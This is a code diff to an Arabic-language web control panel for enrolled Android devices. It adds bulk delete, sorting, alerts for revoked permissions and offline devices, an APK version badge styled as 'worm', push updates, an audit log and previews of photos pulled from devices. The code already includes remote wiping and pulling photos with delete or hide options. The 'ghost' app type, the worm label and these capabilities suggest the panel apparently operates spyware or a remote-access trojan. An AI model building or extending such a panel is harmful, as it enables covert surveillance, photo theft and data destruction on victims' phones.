@@ -91,18 +91,30 @@
           <option value="ghost">Ghost</option>
           <option value="master">Master</option>
         </select>
+        <select data-testid="sort-select" x-model="$store.panel.sortKey" class="chip-select">
+          <option value="createdAt">ترتيب: الانضمام</option>
+          <option value="lastSeen">ترتيب: آخر ظهور</option>
+          <option value="name">ترتيب: الاسم</option>
+        </select>
         <input data-testid="device-search" class="search" type="search" placeholder="بحث بالاسم أو الرقم"
                @input.debounce.300ms="$store.panel.search = $event.target.value" />
         <button data-testid="csv-export" class="chip" @click="$store.panel.exportCsv()">⬇ CSV</button>
+        <button data-testid="bulk-delete" class="chip danger" x-show="$store.panel.selectedIds().length"
+                @click="$store.panel.bulkDelete()"
+                x-text="'حذف (' + $store.panel.selectedIds().length + ')'"></button>
       </div>
 
       <table data-testid="devices-table" class="card">
         <thead>
-          <tr><th></th><th>الاسم</th><th>الموبايل</th><th>النوع</th><th>التطبيق</th><th>الحالة</th><th>معانا منذ</th></tr>
+          <tr><th><input type="checkbox" data-testid="select-all"
+                  @change="$store.panel.toggleSelectAll()" /></th><th></th><th>الاسم</th><th>الموبايل</th><th>النوع</th><th>التطبيق</th><th>الحالة</th><th>معانا منذ</th></tr>
         </thead>
         <tbody>
           <template x-for="d in $store.panel.filteredDevices()" :key="d.id">
             <tr :data-testid="'device-row-' + d.id" @click="$store.panel.show('#/devices/' + d.id)">
+              <td><input type="checkbox" :data-testid="'select-' + d.id"
+                    :checked="!!$store.panel.selected[d.id]"
+                    @click.stop="$store.panel.toggleSelect(d.id)" /></td>
               <td><span class="dot" :class="$store.panel.dotClass(d)"></span></td>
               <td x-text="d.name"></td>
               <td x-text="$store.panel.formatE164(d.phone)"></td>
@@ -132,17 +144,32 @@
 
     <div class="detail-wrap" x-show="$store.panel.view === 'ready'">
       <article class="card" data-testid="device-card">
+        <div class="banner banner-red" data-testid="perm-banner"
+             x-show="$store.panel.missingPerms($store.panel.detail).length">
+          ⚠️ صلاحيات مسحوبة: <span x-text="$store.panel.missingPerms($store.panel.detail).join('، ')"></span>
+        </div>
+        <div class="banner banner-amber" data-testid="offline24-banner"
+             x-show="$store.panel.offlineOver24h($store.panel.detail)">
+          ⚠️ الجهاز غير متصل منذ أكثر من ٢٤ ساعة
+        </div>
         <h2 data-testid="detail-name" x-text="$store.panel.detail?.name"></h2>
         <p>
           <span class="type-badge" :class="$store.panel.appTypeBadge($store.panel.detail || {}).cls"
                 :data-testid="'detail-apptype'"
                 x-text="$store.panel.appTypeBadge($store.panel.detail || {}).label"></span>
+          <span class="type-badge tb-worm" data-testid="detail-version"
+                x-text="'v' + ($store.panel.detail?.apkVersion || '؟')"></span>
           <span data-testid="detail-phone" x-text="$store.panel.formatE164($store.panel.detail?.phone)"></span>
           — <span data-testid="detail-model" x-text="$store.panel.detail?.model"></span>
           — <span data-testid="detail-state" :class="$store.panel.badgeOf($store.panel.detail?.state).className"
                 x-text="$store.panel.badgeOf($store.panel.detail?.state).label"></span>
           — <span data-testid="detail-downloads" x-text="'اتنزّل: ' + ($store.panel.detail?.downloadCount ?? 0)"></span>
         </p>
+        <div class="meta-edit">
+          <input class="search" data-testid="edit-name" placeholder="اسم الجهاز" x-model="$store.panel.editName" />
+          <input class="search" data-testid="edit-notes" placeholder="ملاحظات" x-model="$store.panel.editNotes" />
+          <button data-testid="save-meta" class="chip" @click="$store.panel.saveDeviceMeta($store.panel.route.id)">حفظ</button>
+        </div>
         <div class="actions">
           <button data-testid="detail-reconnect" @click="$store.panel.reconnect($store.panel.route.id)">إعادة ربط</button>
           <button data-testid="detail-delete" class="danger" @click="$store.panel.removeDevice($store.panel.route.id)">حذف</button>
@@ -170,7 +197,20 @@
                   @click="$store.panel.formatWipe($store.panel.route.id)"
                   x-text="$store.panel.wipeArmed ? 'متأكد؟ اضغط تاني للفرمتة' : '⚠️ فرمتة'"></button>
           <button data-testid="cmd-ping" @click="$store.panel.sendCommand($store.panel.route.id, 'ping')">ping</button>
+          <button data-testid="cmd-update" @click="$store.panel.pushUpdate($store.panel.route.id)">⬆ دفع تحديث</button>
           <span data-testid="command-flash" x-show="$store.panel.flash" x-text="$store.panel.flash"></span>
+        </div>
+        <div class="audit" data-testid="audit-log" x-show="$store.panel.auditItems.length">
+          <h3>سجل العمليات</h3>
+          <ul>
+            <template x-for="a in $store.panel.auditItems" :key="a.id">
+              <li>
+                <span class="audit-act" x-text="a.action"></span>
+                <span class="audit-time" x-text="new Date(a.createdAt).toLocaleString('ar-EG')"></span>
+                <span class="audit-actor" x-text="a.actor"></span>
+              </li>
+            </template>
+          </ul>
         </div>
       </article>
 
@@ -202,7 +242,11 @@
         </div>
         <ul class="pull-list">
           <template x-for="p in $store.panel.pullItems()" :key="p.hash">
-            <li x-text="p.name"></li>
+            <li class="pull-item" :data-testid="'photo-' + p.hash.slice(0,8)"
+                @click="$store.panel.previewPhoto(p)">
+              <span x-text="p.name"></span>
+              <span class="hint">👁 معاينة</span>
+            </li>
           </template>
         </ul>
         <input class="spec" data-testid="pull-spec" placeholder="N | DEL N | HIDE N"
@@ -212,6 +256,15 @@
         <div class="progress" x-show="$store.panel.pullModal.progress !== null">
           <div class="bar" :style="'width:' + ($store.panel.pullModal.progress ?? 0) + '%'"></div>
         </div>
+      </div>
+    </div>
+
+    <!-- Photo preview overlay -->
+    <div class="modal-back" data-testid="photo-preview" x-show="$store.panel.previewUrl"
+         @click.self="$store.panel.closePreview()">
+      <div class="card preview-card">
+        <button class="chip" data-testid="preview-close" @click="$store.panel.closePreview()">✕</button>
+        <img :src="$store.panel.previewUrl" alt="preview" />
       </div>
     </div>
   </main>
